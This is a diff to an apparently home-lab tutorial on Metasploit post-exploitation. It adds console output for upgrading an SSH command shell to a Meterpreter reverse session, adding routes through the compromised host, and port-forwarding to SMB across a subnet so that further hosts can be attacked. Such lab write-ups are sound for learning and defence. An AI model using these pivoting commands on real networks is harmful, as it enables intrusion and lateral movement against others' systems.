@@ -140,15 +140,63 @@ Note the value for RHOSTS is 192.168.0.1
 
 WE are interacting with the Debian HOST through the perspective of the guest Kali Linux. So Kali Linux is unaware that the HOST Debian is indeed 10.81.24.X, it only perceives it as anything in its own assigned subnet.
 
-A shell is going to pop. Just a standard Command Shell (SSH). Go upgrade it to meterpreter.
-
-
+A shell is going to pop. Just a standard Command Shell (SSH). 
+```
+msf payload(python/meterpreter/reverse_https) > [*] Command shell session 1 opened (192.168.122.20:45173 -> 192.168.122.1:22) at 2018-03-01 21:26:27 -0800
+```
+Go upgrade it Meterpreter.
 ```
 sessions -u 1
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.122.20:50000 
+[*] Sending stage (857352 bytes) to 192.168.122.1
+[*] Meterpreter session 2 opened (192.168.122.20:50000 -> 192.168.122.1:50938) at 2018-03-01 21:27:47 -0800
+[*] Command stager progress: 100.00% (773/773 bytes)
+
 ```
 
 Another shell will pop. A more featureful shell, you need to route this shell's session into the physical network (as of right now that shell only can perceive network 192.168.0.0/24, the subnet that was granted to it upon KVM's installation).
 
 ```
-route add 
+route add 10.81.24.0/24 2
 ```
+This command will route session 2's traffic (Meterpreter) through to the physical subnet. It is exactly as telling the HOST to do it. 
+
+```
+msf payload(python/meterpreter/reverse_https) > route add 10.81.24.0/24 2
+[*] Route added
+msf payload(python/meterpreter/reverse_https) > route print
+
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.81.24.0         255.255.255.0      Session 2
+
+[*] There are currently no IPv6 routes defined.
+
+```
+
+Metasploit has very specific commands that allow you to continually attacking new victims through a single compromised host. Even to send a exploit against a very specific host that you are aware is vulnerable to a specific attack. But in real life most people are immune to them.
+
+Lets perform a ping sweep, but you have to portforward the port range as well. Interact with your session
+
+```
+sessions -i 1
+meterpreter > portfwd add -l 60001 -p 445 -r 10.81.24.0/24 2
+[*] Local TCP relay created: :60001 <-> 10.81.24.0/24:445
+```
+This command forwards commands sent from
+```My own 60001 ---> to a entire subnet range on a specified port (445)```
+
+The ping_sweep module allows you to use one compromised opponent to...
+
+1. Discover
+2. Attack
+
+New hosts in the same subnet.
+
